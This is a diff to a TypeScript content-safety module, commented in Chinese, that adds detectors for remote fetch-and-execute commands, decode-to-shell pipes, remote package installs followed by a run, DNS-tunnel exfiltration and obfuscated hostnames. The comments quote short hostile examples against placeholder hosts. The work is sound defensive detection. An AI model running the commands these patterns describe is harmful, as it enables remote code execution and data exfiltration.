@@ -1547,6 +1547,20 @@ export const EXEC_INSTALLER_WARN_MARK =
 export const EXEC_DEGRADED_NOTICE =
   "（本次回答处于代码安全判别降级窗口：判别服务超时/不可用，系统已对疑似可执行的段落保守隔离，其余内容照常给出；稍后重试可获得完整判定。）";
 
+/**
+ * R306 P0-1（audit-r305 §3）：不经 noteToJson 的出口（周报/备份/Push/线索摘要/
+ * MCP）统一使用的危险标注文案。行内短标用于列表行/推送体，整行警示用于
+ * Markdown/JSON 附带字段。
+ */
+export const EXEC_OUTLET_WARN_TAG = "〔警示：含可执行命令，勿执行〕";
+export const EXEC_OUTLET_WARN_LINE =
+  "⚠️ 本条笔记含可执行命令/危险指令（如下载执行远程代码），仅供查阅，请勿直接执行。";
+
+/** 出口维度危险标注：内容命中数据面判定时返回行内短标，否则空串。 */
+export function execOutletTag(content: string | null | undefined): string {
+  return content && noteContainsExecutableCommand(content) ? EXEC_OUTLET_WARN_TAG : "";
+}
+
 /** R298 P0-1：确定性判危但语义判别器零命中时的说明（判别器在线，不是降级）。 */
 export const EXEC_CONSERVATIVE_NOTICE =
   "（上面被隔离的段落含系统判定为「会下载执行远程代码或建立外连」的内容，未展示；原文可在引用的笔记卡片中查看。）";
@@ -1577,6 +1591,11 @@ const SPOOFED_CONTROL_MARK_RE = new RegExp(
   ].join("|"),
   "g"
 );
+
+/** 答案是否已带真控制标记（〔已隔离…〕/〔代码安全判别…〕/统一隔离文案）——finalize 之后调用。 */
+export function hasGuardControlMark(answer: string): boolean {
+  return /〔已隔离|〔代码安全判别|〔警示/.test(answer) || answer.includes(ISOLATION_NOTICE_ANSWER);
+}
 
 /**
  * 剥除内容侧仿冒的系统控制标注/审计标记（R276 P0-2）。在统一出口的最前端
@@ -1922,16 +1941,16 @@ const EXEC_FETCH_RE =
 // （`. <(curl …)` / `source <(curl …)`）旧口径要求行首或分隔符锚定，写在
 // 中文冒号/叙述后面时不命中 ⇒ sink 能力落空 ⇒ fetch+sink 不成立。
 const EXEC_SINK_RE =
-  /\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k|fi)?sh|python[0-9.]*|perl|ruby|node|php|pwsh|powershell)\b|\b(?:ba|z)?sh\s+(?:-[a-z]+\s+)?<\(|\bsource\s+<\(|(?:^|[\s;&|(:：])\.\s+<\(|\beval\s|\|\s*iex\b|\biex\s*\(|invoke-expression|-enc(?:odedcommand)?\b|(?:^|[;&|]|&&|\|\|)\s*(?:sudo\s+)?(?:\.\/\S+|(?:ba|z)?sh\s+\S+\.\w{1,4}|python[0-9.]*\s+\S+\.py|source\s+\S+)/i;
+  /\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k|fi)?sh|python[0-9.]*|perl|ruby|node|php|pwsh|powershell)\b|\b(?:ba|z)?sh\s+(?:-[a-z]+\s+)?<\(|\bsource\s+<\(|(?:^|[\s;&|(:：])\.\s+<\(|\beval\s|\.then\s*\(\s*(?:eval|Function|new\s+Function)\s*\)|\|\s*iex\b|\biex\s*\(|invoke-expression|-enc(?:odedcommand)?\b|(?:^|[;&|]|&&|\|\|)\s*(?:sudo\s+)?(?:\.\/\S+|(?:ba|z)?sh\s+\S+\.\w{1,4}|python[0-9.]*\s+\S+\.py|source\s+\S+)/i;
 
 // R294 P0-1（audit-r293 §2 C06/C07/C08/C22）：「解码器 → 解释器」链。
 // `echo <rot13> | tr A-Za-z N-ZA-Mn-za-m | sh`、`echo <hex> | xxd -r -p | bash`、
 // `$(echo <b64> | base64 -d)` 在字面上既无 curl 也无已知命令名，但「把解码
 // 产物交给解释器/命令替换执行」本身就是完整的执行语义，与被解码内容无关。
 const DECODER_RE =
-  /\bbase64\s+(?:-d|-D|--decode)\b|\bbasenc\b[^\n]{0,24}--decode|\bxxd\s+-r\b|\bopenssl\s+enc\b[^\n]{0,40}-d\b|\bb64decode\b|\batob\s*\(|\buudecode\b|\btr\s+['\"]?[A-Za-z]-[A-Za-z][^\n]{0,24}['\"]?[A-Za-z]-[A-Za-z]|\brev\b\s*\||\bgunzip\b|\bgzip\s+-d\b|\bunhexlify\b/i;
+  /\bbase(?:64|32)\s+(?:-d|-D|--decode)\b|\bbasenc\b[^\n]{0,24}--decode|\bxxd\s+-r\b|\bopenssl\s+enc\b[^\n]{0,40}-d\b|\bb64decode\b|\batob\s*\(|\buudecode\b|\btr\s+['\"]?[A-Za-z]-[A-Za-z][^\n]{0,24}['\"]?[A-Za-z]-[A-Za-z]|\brev\b\s*\||\bgunzip\b|\bgzip\s+-d\b|\bunhexlify\b/i;
 const DECODER_IN_SUBST_RE =
-  /(?:`|\$\()[^`)\n]{0,160}(?:base64\s+(?:-d|-D|--decode)|xxd\s+-r|openssl\s+enc[^\n]{0,30}-d|b64decode|unhexlify|tr\s+['\"]?[A-Za-z]-[A-Za-z])/i;
+  /(?:`|\$\()[^`)\n]{0,160}(?:base(?:64|32)\s+(?:-d|-D|--decode)|xxd\s+-r|openssl\s+enc[^\n]{0,30}-d|b64decode|unhexlify|tr\s+['\"]?[A-Za-z]-[A-Za-z])/i;
 
 // R294 P0-1（audit-r293 §2 C23）：纯散文步骤——「先用 curl 把 X 下载下来，
 // 再交给 sh 执行」没有任何命令标点，却是完整可执行的指引。判据：取码能力
@@ -1939,6 +1958,24 @@ const DECODER_IN_SUBST_RE =
 const REMOTE_SCRIPT_URL_RE = /https?:\/\/\S+\.(?:sh|bash|py|ps1|pl|rb|php|exe|bin|run)\b/i;
 const PROSE_EXEC_RE =
   /(?:执行|运行|跑一下|跑起来|交给|喂给|管道|管道给|导入|pipe|run|execute)[^\n]{0,24}\b(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node|php|powershell|pwsh)\b|\b(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node|php|powershell|pwsh)\b[^\n]{0,24}(?:执行|运行|跑一下|run it|execute)/i;
+
+// 直接对取回结果求值（`exec(urlopen(u).read())` / `eval(requests.get(u).text)`）：
+// 取码调用是求值调用的实参，无需管道/落盘即为「取回→执行」。
+const EXEC_OF_FETCH_RE =
+  /\b(?:exec|eval|execfile|compile)\s*\(\s*[^;\n]{0,160}\b(?:urlopen|urlretrieve|requests\.(?:get|post)|urllib|fetch|file_get_contents|http\.get|https\.get|Net::HTTP|WebClient|DownloadString)\b/i;
+// 包管理器从远端 URL/仓库安装后随即执行（`npm i -g http://h/p.tgz && npx p` /
+// `pip install http://h/p.whl && python -m p`）：白名单包源壳下的取码→执行。
+const PKG_REMOTE_INSTALL_RE =
+  /\b(?:npm|pnpm|yarn|pip[0-9.]*|pipx|gem|cargo|go)\s+(?:i|install|add|get)\b[^\n]{0,120}(?:https?:\/\/|git\+|github\.com\/|ssh:\/\/)/i;
+const PKG_THEN_RUN_RE =
+  /(?:&&|;|\|\||\n)\s*(?:sudo\s+)?(?:npx|node|pnpm\s+(?:dlx|exec)|yarn\s+(?:dlx|run)|npm\s+(?:run|exec|start)|python[0-9.]*(?:\s+-m)?|pipx\s+run|ruby|cargo\s+run|\.\/|~\/|\$?\(?\w*\/bin\/)/i;
+// DNS 隧道外传：解析器（dig/nslookup/host）的查询名由命令替换/变量拼出子域，
+// 或与本地文件读入/编码器同现——查询名本身就是外传载荷。
+const DNS_TOOL_RE = /\b(?:dig|nslookup|host|drill|kdig|delv|resolvectl\s+query)\b/i;
+const DNS_TUNNEL_RE =
+  /\b(?:dig|nslookup|host|drill|kdig|delv)\b[^\n]{0,160}(?:\$\([^)\n]{0,120}\)|`[^`\n]{0,120}`|\$\{?\w+\}?)\.[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,24}\b/i;
+const DNS_EXFIL_CTX_RE =
+  /\b(?:base64|base32|xxd|od|hexdump|gzip|tar)\b|<\s*\/?(?:etc|home|root|var|proc)\/|\b(?:while|for)\b[^\n]{0,40}\bread\b|\bcat\s+\/?(?:etc|home|root|var)\//i;
 
 // 反弹外连/远控（行为角色 C）：单独即危险，无需组合
 const NET_BACKCONNECT_RE =
@@ -2052,7 +2089,7 @@ const LOLBIN_REMOTE =
 
 // 语言内远程取码/取数据（CAP_FETCH 扩展，与命令行 EXEC_FETCH_RE 并列）
 const LANG_FETCH =
-  /\burllib(?:2|\.request)?\b|\brequests\.(?:get|post)\b|\bhttp\.client\b|\bhttplib\b|\bNet::HTTP\b|\bLWP::(?:Simple|UserAgent)\b|\bopen-uri\b|\bURI\.(?:open|parse)\b|\bfile_get_contents\s*\(\s*['"]https?:|\bcurl_(?:init|exec)\s*\(|\bfetch\s*\(\s*['"]https?:|\bhttps?\.get\s*\(|\bXMLHttpRequest\b|\bInvoke-RestMethod\b|\bNew-Object\s+(?:System\.)?Net\.WebClient\b/i;
+  /\burllib(?:2|\.request)?\b|\burlopen\s*\(|\burlretrieve\s*\(|\brequests\.(?:get|post)\b|\bhttp\.client\b|\bhttplib\b|\bNet::HTTP\b|\bLWP::(?:Simple|UserAgent)\b|\bopen-uri\b|\bURI\.(?:open|parse)\b|\bfile_get_contents\s*\(\s*['"]https?:|\bcurl_(?:init|exec)\s*\(|\bfetch\s*\(\s*[`'"]https?:|\bhttps?\.get\s*\(|\bXMLHttpRequest\b|\bInvoke-RestMethod\b|\bNew-Object\s+(?:System\.)?Net\.WebClient\b/i;
 
 /** 能力识别结果（可测试、可解释；判定理由随 hasExecIntentReason 暴露）。 */
 export type ExecCapabilities = {
@@ -2098,6 +2135,11 @@ export function hasExecIntentReason(normalized: string): string | null {
   if (c.fetch && c.sink) return "cap:fetch+sink";
   if (c.inline && c.fetch && c.exec) return "cap:inline+fetch+exec";
   if (c.fetch && c.priv) return "cap:fetch+priv";
+  if (EXEC_OF_FETCH_RE.test(normalized)) return "cap:exec-of-fetch";
+  if (PKG_REMOTE_INSTALL_RE.test(normalized) && PKG_THEN_RUN_RE.test(normalized))
+    return "cap:remote-install+run";
+  if (DNS_TUNNEL_RE.test(normalized) || (DNS_TOOL_RE.test(normalized) && DNS_EXFIL_CTX_RE.test(normalized) && /\$\(|`|\$\{?\w/.test(normalized)))
+    return "cap:dns-tunnel";
   // R294 P0-1：解码器 → 解释器/命令替换（与被解码内容无关的执行语义）
   if (c.sink && DECODER_RE.test(normalized)) return "cap:decode+sink";
   if (DECODER_IN_SUBST_RE.test(normalized)) return "cap:decode+cmdsubst";
@@ -2220,9 +2262,14 @@ function isCodeLine(line: string): boolean {
   if (!line.trim()) return false;
   const cjk = (line.match(/[\u3040-\u30ff\u3400-\u9fff\uac00-\ud7af]/g) ?? []).length;
   if (cjk >= 8 && !/```|^\s{4,}\S|^\s*[$#>]\s+\S/.test(line)) return false;
+  // R306 P0-3（audit-r305 §4：导航 URL 行 `wide:code-line` 整段隔离）：URL 本身
+  // 不是命令面——斜杠/`k=v` 查询串是 URL 的固有形态，不是 shell 路径/赋值。
+  // 指向脚本文件的 URL（`https://h/p.sh`）保留代码行身份（取码原语本体）。
+  if (REMOTE_SCRIPT_URL_RE.test(line)) return true;
+  const noUrl = line.replace(/\bhttps?:\/\/[^\s<>()"'`]+/gi, "URL");
   if (looksLikeCode(line)) return true;
   // 紧邻式函数调用 `foo(` / 成员调用 `a.b(` / 赋值 `x = y`（不含比较 `==`）
-  if (/[A-Za-z_$][\w$]*\s*\(|[\w\]]\s*=\s*[^=\s]/.test(line)) return true;
+  if (/[A-Za-z_$][\w$]*\s*\(|[\w\]]\s*=\s*[^=\s]/.test(noUrl)) return true;
   // 限定标识符调用行（`cmd.Run`、`conn.close`）与块收尾行（`}`、`end`、`done`）：
   // 模型渲染常把空参括号吃掉，这类行没有任何「代码标点」，若判成散文就会成为
   // 单元边界，把同一段代码劈成两半（R286 P2-1 实测：`cmd.Run` 被留在单元外）。
@@ -2231,7 +2278,7 @@ function isCodeLine(line: string): boolean {
   // R286：shell/命令行形态也是代码行——`curl -fsSL … -o /tmp/s.sh`、`chmod +x …`、
   // `/tmp/s.sh`、`cat <&3 | sh >&3` 没有 `{};()` 也没有赋值，旧判据把它们当散文，
   // 于是「取码 → 赋权 → 执行」这类跨行管道根本不成单元（实测放行，见 §1）。
-  if (SHELL_LINE_RE.test(line)) return true;
+  if (SHELL_LINE_RE.test(noUrl)) return true;
   // R286 P0-1b：裸调用行（`sh init.sh`、`& .\a.ps1`、`npm ci`）既无选项也无斜杠
   // 路径，旧判据判成散文 ⇒ 成为单元边界 ⇒ 「取码→执行」里执行的那一行被切到
   // 单元之外，跨行聚合无从谈起（实测 curl -O / iwr 形态放行）。
@@ -2338,7 +2385,7 @@ export function execDegradedIsolationUnits(
 // 代码”的完整语义，与语言/工具无关。部署手册里常见的 `curl -o pkg.tgz` +
 // `tar xzf pkg.tgz` 不命中（tar 不是执行），这是该判据与误伤的边界。
 const FETCH_TO_PATH_RE =
-  /(?:curl|wget|iwr|invoke-webrequest|fetch|urlretrieve|requests\.get|http\.get)[^\n]*?(?:-(?:o|O|outfile|OutFile)\s+|>\s*|,\s*)([^\s"'`;|>]+)/gi;
+  /(?:curl|wget|iwr|invoke-webrequest|fetch|urlretrieve|requests\.get|http\.get)[^\n]*?(?:-(?:o|O|outfile|OutFile)\s+|>\s*|,\s*)([\w.~$@{}\\/-]*[\\/.][\w.~$@{}\\/-]*)/gi;
 const WRITE_TO_PATH_RE = /open\(\s*["']([^"']+)["']\s*,\s*["'][wa]/g;
 
 /** 路径末端名（去目录，用于跳目录引用的匹配）。 */
@@ -2540,12 +2587,14 @@ const PLAIN_IPV4_RE = /(?<![\d.])(?:\d{1,3}\.){3}\d{1,3}(?![\d.])/;
 /** 远程脚本地址（域名/IP + 脚本路径）——不要求协议头。 */
 const REMOTE_SCRIPT_PATHY_RE =
   /(?:[a-z0-9-]+\.)+[a-z]{2,24}(?::\d{2,5})?\/\S*\.(?:sh|bash|py|ps1|pl|rb|php|exe|bin|run)\b/i;
+/** 脚本文件名（可执行载荷的落地形态）。 */
+const SCRIPT_FILE_NAME_RE = /\b[\w-]+\.(?:sh|bash|zsh|py|ps1|pl|rb|php|exe|bin|run|tgz|jar|msi|bat|cmd|vbs|hta)\b/i;
 const PORTY_RE =
   /(?:\b(?:port|PORT)\b|端口|ポート|포트)[^\n]{0,8}\d{2,5}|\d{2,5}\s*(?:号|號)?\s*(?:端口|哨站|ポート|포트)|\bport\s*\d{2,5}\b|(?:\d{1,3}\.){3}\d{1,3}\s*[:：]\s*\d{2,5}/i;
 
 /** 取回/下载语义（跨语言 + 口语/比喻替代词）。 */
 const SEM_FETCH_RE =
-  /取回|取回来|取来|取彼|携归|携回|攜歸|领取|領取|攞|拿回|拿来|端回|捞回|拉下来|拉取|拉回|下载|下載|download|拉一份|抓下来|抓取|获取|取得|取码|取碼|扒下来|弄下来|搞下来|ダウンロード|取り寄せ|받아|내려받|다운로드|가져와|가져오|钓|捡|摘下|采下|取上来|拿上来|弄上来|搞上来|取件|领回|fetch|pull\s+(?:down|it)|grab|retrieve|curl|wget|取\s*[^\n，,。.]{0,8}(?:包|脚本|腳本|文件|档案|檔案|小工具|工具|镜像|鏡像)|скача|загрузи|حمّ?ل|نزّ?ل|descarga|télécharge|herunterlade|lade\w*[^\n]{0,60}herunter|\bt[ảa]i\b|ดาวน์โหลด|\bunduh\b|\bmuat\s+turun\b|\bscarica|\bbaixe\b|\bpobierz\b|\bindir\b/i;
+  /取回|取回来|取来|取彼|携归|携回|攜歸|领取|領取|攞|拿回|拿来|端回|捞回|拉下来|拉取|拉回|下载|下載|download|拉一份|抓下来|抓取|获取|取得|取码|取碼|扒下来|弄下来|搞下来|下下来|下下來|(?:去|把|先)\s*下\s*(?=[\w./-]*\.(?:sh|bash|py|ps1|pl|rb|exe|bin|run|tgz|jar)\b)|(?:拉|下)\s*(?:一个|一份|个|個)?\s*[^\n，,。.]{0,6}(?:包|脚本|腳本|文件|档案|檔案|镜像|鏡像|代码|代碼|程序|payload)|ダウンロード|取り寄せ|받아|내려받|다운로드|가져와|가져오|钓|捡|摘下|采下|取上来|拿上来|弄上来|搞上来|取件|领回|fetch|pull\s+(?:down|it)|grab|retrieve|curl|wget|取\s*[^\n，,。.]{0,8}(?:包|脚本|腳本|文件|档案|檔案|小工具|工具|镜像|鏡像)|скача|загрузи|حمّ?ل|نزّ?ل|descarga|télécharge|herunterlade|lade\w*[^\n]{0,60}herunter|\bt[ảa]i\b|ดาวน์โหลด|\bunduh\b|\bmuat\s+turun\b|\bscarica|\bbaixe\b|\bpobierz\b|\bindir\b/i;
 
 /** 「交给解释器/壳去跑」语义：执行动作 + 解释器/壳类受体（含比喻受体）。 */
 const SEM_INTERP_TARGET_RE =
@@ -2553,7 +2602,7 @@ const SEM_INTERP_TARGET_RE =
 const SEM_HANDOFF_RE =
   /交给|交給|交过去|交過去|交由|交上去|付于|付與|付给|付給|念给|念給|掉落|撒进|撒入|丢给|丟給|喂给|餵給|递给|遞給|倒进|倒進|灌进|灌進|接到|接给|接給|管道|竖线|豎線|贴到|貼到|粘到|粘进|扔进|扔給|扔给|下到|种进|种到|放进|放入|装进|倒入|下锅|pipe\s*(?:it|into|to)?|pour\s+(?:it\s+)?(?:in)?to|hand\s+(?:it\s+)?(?:over\s+)?to|feed\s+(?:it\s+)?(?:in)?to|流し込|渡して|パイプ|파이프|넘겨|붙여넣/i;
 const SEM_RUN_RE =
-  /执行|執行|行之|施行|运行|運行|跑起来|跑掉|跑一下|跑一遍|跑几遍|跑幾遍|跑通|煮开|煮開|开火|開火|回车即可|回车执行|回車執行|照做|照跑|直接跑|直接执行|煮|冲开|熟|服下|演奏|长起来|发芽|(?:\bsh\b|\bbash\b|\bzsh\b|\bpython\b|\bnode\b)\s*(?:一下|一遍)|run\s+it|execute|launch\s+it|bring\s+to\s+a\s+boil|実行|走らせ|실행|돌려|구동|запуст|выполн|исполни|установи|شغل|نفذ|ejec[úu]t|ex[eé]cut|führ\w*[^\n]{0,60}\baus\b|\bch[ạa]y\b|รัน|\bjalankan\b|\besegui|\bexecute\b|\buruchom\b|\b[çc]al[ıi][şs]t[ıi]r\b/i;
+  /执行|執行|行之|施行|运行|運行|跑起来|跑掉|跑一下|跑一遍|跑几遍|跑幾遍|跑通|煮开|煮開|开火|開火|回车即可|回车执行|回車執行|照做|照跑|直接跑|直接执行|煮|冲开|熟|服下|演奏|长起来|发芽|(?:\bsh\b|\bbash\b|\bzsh\b|\bpython\b|\bnode\b)\s*(?:一下|一遍|跑|执行|運行|运行)|(?:用|拿|交给|交給|丢给|丟給)\s*(?:\bsh\b|\bbash\b|\bzsh\b|\bpython\b|\bnode\b|壳|殼|终端|終端)\s*(?:去)?\s*(?:跑|执行|運行|运行|起来|起來)|run\s+it|execute|launch\s+it|bring\s+to\s+a\s+boil|実行|走らせ|실행|돌려|구동|запуст|выполн|исполни|установи|شغل|نفذ|ejec[úu]t|ex[eé]cut|führ\w*[^\n]{0,60}\baus\b|\bch[ạa]y\b|รัน|\bjalankan\b|\besegui|\bexecute\b|\buruchom\b|\b[çc]al[ıi][şs]t[ıi]r\b/i;
 /** 拼写拆字型命令名（c-u-r-l / w g e t 等）——逐字母口述规避字面匹配。 */
 const SPELLED_CMD_RE =
   /\bc\s*[-·．.、]\s*u\s*[-·．.、]\s*r\s*[-·．.、]\s*l\b|\bw\s*[-·．.、]\s*g\s*[-·．.、]\s*e\s*[-·．.、]\s*t\b|[两兩]个?字母\s*s\s*h\b/i;
@@ -2569,7 +2618,7 @@ const SEM_DECODE_RE = /解码|解出|解完|解开|还原|還原|base64|decode/i
  * 良性技术笔记里「解码后看看配置」只有还原语义、无取回+执行同现，不命中。
  */
 const SEM_DECODE_ADDR_RE =
-  /解出地址|解成主机名|解成主機名|解出主机名|解出主機名|解码后|解碼後|解出来|反过来读|反過來讀|倒过来读|倒序|反写|反寫|倒着读|倒著讀|还原后|還原後|rot13|base32|base45|base64|十六进制|十六進制|punycode|摩斯|morse|盲文|braille/i;
+  /解出地址|解成主机名|解成主機名|解出主机名|解出主機名|解码后|解碼後|解出来|反过来读|反過來讀|倒过来读|倒過來讀|倒过来|倒過來|反过来|反過來|倒序|反写|反寫|倒着读|倒著讀|还原后|還原後|rot13|base32|base45|base64|十六进制|十六進制|punycode|摩斯|morse|盲文|braille/i;
 /** 拼音转写的执行语义（汉字被拆成罗马化读音时仍是同一语义）。 */
 const PINYIN_FETCH_RE = /\bxia\s?zai\b|\bxia\s?zai\s?xia\s?lai\b|\bqu\s?hui\b|\bla\s?qu\b/i;
 const PINYIN_HANDOFF_RE = /\bjiao\s?gei\b|\bdao\s?jin\b|\bshu\s?xian\b/i;
@@ -2602,6 +2651,8 @@ type SemanticExecSignals = {
   bidiExec: boolean;
   /** 远程脚本路径地址 + 同句「取回 + 解释器」（`curl http://h/p.sh 再 sh`）。 */
   scriptFetchInterpSameSentence: boolean;
+  /** 脚本文件名 + 取回 + 解释器同句（地址可在句外/另一条笔记）。 */
+  scriptFileFetchInterpSameSentence: boolean;
   /** 端口 + 壳/终端 + 接线/重定向：反弹 shell 的纯散文写法。 */
   reverseShell: boolean;
   /** 外传/上报语义（跨语言）：把东西送到远端。 */
@@ -2639,6 +2690,15 @@ function semanticExecSignals(text: string): SemanticExecSignals {
   // NFKC 会把个别码位（如 U+1FBF）展成「空白 + 组合符」，分隔片段在折叠面上
   // 退化成空格而识别不出地址 ⇒ 归一化面同时取 **NFKC 前**的原面。
   const surfaces = [normalizeAddressSurface(base), normalizeAddressSurface(stripInvisibleCarriers(text))];
+  // R306 P0-2（B03 ROT13 域 / B04 倒序域）：「先解码再判地址面」——载体必须自带
+  // 还原说明（rot13/倒过来/…）才能被人还原，这句说明就是启用解码面的信号；
+  // 解码面只在 token 级逆变换落回「带公共 TLD 的主机名」时采信。
+  if (SEM_DECODE_ADDR_RE.test(base) || /\bebg13\b|\brot\s*13\b/i.test(base)) {
+    for (const sf of [...surfaces]) {
+      const dec = decodeAddressTokenSurface(sf);
+      if (dec !== sf) surfaces.push(dec);
+    }
+  }
   const folded = [base, ...surfaces.filter((s) => s !== base)].join("\n");
   // R302 P0-1（audit-r301 §16 第 1 项）：危险语义判定的地址面**不免除白名单**——
   // 白名单只免除地址形态判定（良性提及），不免除同现的动作语义：
@@ -2682,12 +2742,25 @@ function semanticExecSignals(text: string): SemanticExecSignals {
       (t) => SEM_FETCH_RE.test(t) || PINYIN_FETCH_RE.test(t),
       (t) => SEM_INTERP_TARGET_RE.test(t),
     ]),
+    scriptFileFetchInterpSameSentence: sentenceCooccur(folded, [
+      (t) => SCRIPT_FILE_NAME_RE.test(t),
+      (t) => SEM_FETCH_RE.test(t) || PINYIN_FETCH_RE.test(t),
+      (t) => SEM_INTERP_TARGET_RE.test(t),
+    ]),
     bidiExec:
       /[\u202a-\u202e\u2066-\u2069]/.test(text) &&
       (SEM_RUN_RE.test(folded) || (SEM_FETCH_RE.test(folded) && SEM_INTERP_TARGET_RE.test(folded))),
     // 方法调用形（client.send(…) / res.post(…)）是良性代码常态，不算外传语义。
     exfil: (() => {
-      const prose = folded.replace(/\.\s*(?:send|post|upload|export|emit)\s*\(/gi, "(");
+      // 他人向「我」分享/转发/推荐（「同事分享的博客」/「shared by」）是入向，
+      // 不是把自有资料送出去；剥掉入向主语短语后再判外向动词。
+      const prose = folded
+        .replace(/\.\s*(?:send|post|upload|export|emit)\s*\(/gi, "(")
+        .replace(
+          /(?:同事|朋友|老师|老師|同学|同學|群里|群裡|群友|别人|別人|网友|網友|博主|作者|老板|老闆|领导|領導|客户|客戶|他|她|大家)\s*(?:分享|发给|發給|发来|發來|转发|轉發|推荐|推薦|推给|推給)(?:给我|給我)?(?:的|了|过|過)/g,
+          ""
+        )
+        .replace(/\b(?:shared|forwarded|sent|recommended)\s+(?:by|from)\b/gi, "");
       if (/上报|回传|外传|回報|выгруз|отправ/i.test(prose)) return true;
       if (EXFIL_ACT_OUTWARD.test(prose)) return true;
       if (!EXFIL_ACT.test(prose)) return false;
@@ -2831,12 +2904,101 @@ function cjkDigitsToAscii(s: string): string {
 // \x2e 转义、分行拆域）都是多字符片段，单字符规则一律漏过（R303 实测
 // hasRemoteEndpointForm 对 `evil[.]example[.]com` 返回 false）。按类折叠，
 // 不枚举具体 defang 写法。
+// R306 P0-2（audit-r305 §2：X02/X05/X28/X29 全裸露）：分隔词不再只枚举
+// 中/英两种写法——「把点读出来」在任何语言里都是同一类载体，按语义
+// 角色（分隔词）给多语言词表，两侧限标签字符（ASCII 字母数字），并容忍
+// 插词（「然后一个点，然后」/「then a dot then」）——插词只是口语节奏，
+// 不改地址语义。仅在判定面生效（normalizeAddressSurface）。
+// 不用 i/u 标志（V8 对 unicode 大小写折叠 + \b 的组合走慢路径，剖析占
+// finalize 20%）：拉丁词首字母大小写手写枚举，其余脚本本无大小写。
+const SEP_WORD_DOT =
+  /句号|句號|句点|句點|点|點|\b[Dd](?:ot|OT)\b|\b[Pp](?:unkt|UNKT|oint|OINT|unto|UNTO|onto|ONTO|unt|UNT|iste|ISTE)\b|\b[Nn](?:okta|OKTA)\b|\b[Tt](?:itik|ITIK)\b|\b[Dd](?:otto|OTTO)\b|точка|точку|тчк|ドット|نقطة|จุด|점|도트/
+    .source;
+// 插词/连词（可重复）：标点、空白、「然后/再/接着/一个」及其多语言对应词。
+const SEP_FILLER =
+  /(?:[\s,，、;；]|然后|然後|再|接着|接著|跟着|一个|一個|个|個|加上|加|后|後|\b(?:[Tt]hen|[Aa]nd?|[Aa]n|[Uu]nd|[Dd]ann|[Ee]t|[Pp]uis|[Ll]uego|[Yy]|[Pp]oi)\b){0,6}/
+    .source;
+// 折叠按「分隔词命中 → 两侧各回看/前看插词 → 两侧须为标签字符」过程式实现，
+// 不写成一个两侧带 {0,6} 插词回溯的大正则（后者对每个位置都要试探，CPU
+// 剖析占 finalize 22%）。
+const SEP_WORD_ANY_RE = new RegExp(SEP_WORD_DOT, "g");
+const SEP_FILLER_TAIL_RE = new RegExp(`^${SEP_FILLER}`);
+const SEP_FILLER_HEAD_RE = new RegExp(`${SEP_FILLER}$`);
+const LABEL_CHAR_RE = /[A-Za-z0-9]/;
+function foldSepWords(s: string): string {
+  if (!SEP_WORD_ANY_RE.test(s)) {
+    SEP_WORD_ANY_RE.lastIndex = 0;
+    return s;
+  }
+  SEP_WORD_ANY_RE.lastIndex = 0;
+  let out = "";
+  let cursor = 0;
+  for (const m of s.matchAll(SEP_WORD_ANY_RE)) {
+    const at = m.index;
+    if (at < cursor) continue;
+    // 左侧：最多回看 48 字符内的插词，其前必须是标签字符
+    const leftWin = s.slice(Math.max(cursor, at - 48), at);
+    const leftFill = SEP_FILLER_HEAD_RE.exec(leftWin)?.[0] ?? "";
+    const leftStart = at - leftFill.length;
+    if (leftStart === 0 || !LABEL_CHAR_RE.test(s[leftStart - 1])) continue;
+    const rightWin = s.slice(at + m[0].length, at + m[0].length + 48);
+    const rightFill = SEP_FILLER_TAIL_RE.exec(rightWin)?.[0] ?? "";
+    const rightEnd = at + m[0].length + rightFill.length;
+    if (rightEnd >= s.length || !LABEL_CHAR_RE.test(s[rightEnd])) continue;
+    out += s.slice(cursor, leftStart) + ".";
+    cursor = rightEnd;
+  }
+  return out + s.slice(cursor);
+}
+
+/**
+ * 字面拼接合拢（R302 P0-3 / R306 P0-2 T02、T03）：
+ *  - `"exam"+"ple.com"` → `example.com`（引号+加号+引号只是表层语法）；
+ *  - 模板占位符里的字面（`${"relay3"}.${"example"}.net`）取字面本身；
+ *    不可解析的占位符（`${H}.com`）折为定长标签——「占位符.公共TLD」本身
+ *    就是地址模板，判定面按域名对待；
+ *  - `".".join(["relay3","example","net"])` / `"/".join([...])` 按分隔符拼回。
+ */
+function foldLiteralConcat(input: string): string {
+  let t = input;
+  t = t.replace(
+    /(["'])([^"'\n]{0,3})\1\s*\.\s*join\s*\(\s*[[(]([^\])\n]{1,240})[\])]\s*\)/g,
+    (_m, _q: string, sep: string, items: string) =>
+      items
+        .split(",")
+        .map((x) => x.trim().replace(/^["'`]|["'`]$/g, ""))
+        .filter((x) => x.length > 0)
+        .join(sep)
+  );
+  t = t.replace(/\$\{\s*(["'`])([^"'`}\n]{1,32})\1\s*\}/g, "$2");
+  t = t.replace(/["'`]\s*\+\s*["'`]/g, "").replace(/\$\{[^}\n]{1,32}\}/g, "x");
+  return t;
+}
+
+/** 带方括号的 IPv6（可带端口）——分隔片段折叠不得破坏它的结构。 */
+const BRACKET_V6_G = /\[[0-9a-f:.]{2,45}\](?::\d{2,5})?/gi;
+
 function foldDefangedSeparators(input: string): string {
+  // 方括号 IPv6 先遮住（R306 P0-2，E07）：`http://[2001:db8::1]:8080/p.sh` 里的
+  // `://[` 会被「非标签片段→点」规则吃掉，地址面退化成 `http.2001:db8::1.8080`，
+  // 端点形态消失。占位符用纯字母数字（不会被任何分隔片段规则命中）。
+  const v6: string[] = [];
+  let t = input.replace(BRACKET_V6_G, (m) => {
+    v6.push(m);
+    return `zzv6x${v6.length - 1}xzz`;
+  });
+  t = foldDefangedSeparatorsInner(t);
+  return v6.length === 0
+    ? t
+    : t.replace(/zzv6x(\d+)xzz/g, (m, i: string) => v6[Number(i)] ?? m);
+}
+
+function foldDefangedSeparatorsInner(input: string): string {
   let t = input;
   // 字符串拼接与模板占位符（R302 P0-3）先合拢：否则下方的混合片段折叠会把
   // `"+"` / `${X}` 里的引号花括号折成点，破坏拼接/模板语义（幂等，
   // normalizeAddressSurface 里的同名规则仍保留处理 NFKC 后的形态）
-  t = t.replace(/["'`]\s*\+\s*["'`]/g, "").replace(/\$\{[^}\n]{1,32}\}/g, "x");
+  t = foldLiteralConcat(t);
   // 协议去牙：hxxp(s) / h**p(s) / hXXp(s) → http(s)
   t = t.replace(/\bh(?:xx|\*\*|x\*|\*x)p(s?)\b/gi, "http$1");
